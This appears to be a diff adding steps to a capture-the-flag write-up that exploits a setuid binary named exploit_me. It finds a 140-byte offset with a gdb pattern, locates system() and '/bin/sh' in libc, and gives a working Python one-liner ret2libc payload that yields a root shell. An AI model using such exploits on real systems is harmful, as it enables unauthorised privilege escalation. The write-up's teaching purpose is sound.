@@ -423,8 +423,43 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
--> We can do a buffer overflow, with a ret2libc.  
+The program is taking one argument, and does a puts of it.  
+```
+# ./exploit_me hello
+hello
+```
 
+## Finding the offset
+
+With the pattern generator, we find an offset of 140  
+```
+(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Starting program: /home/zaz/exploit_me Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37654136 in ?? ()
+```
+
+## ret2libc
+
+-> As the strcpy() function is not protected, we can do a buffer overflow, with a ret2libc.  
+
+```
+Address of system:
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+
+Address of /bin/sh:
+(gdb) find &system,+9999999,"/bin/sh"
+0xb7f8cc58
+warning: Unable to access target memory at 0xb7fd3160, halting search.
+1 pattern found.
+```
+
+## payload
+
+We can now build the payload:  
 `./exploit_me $(python -c 'print "A" * 140 + "\x60\xb0\xe6\xb7" + "\xde\xad\xbe\xef" + "\x58\xcc\xf8\xb7"')`
 
 -> We are now root !  
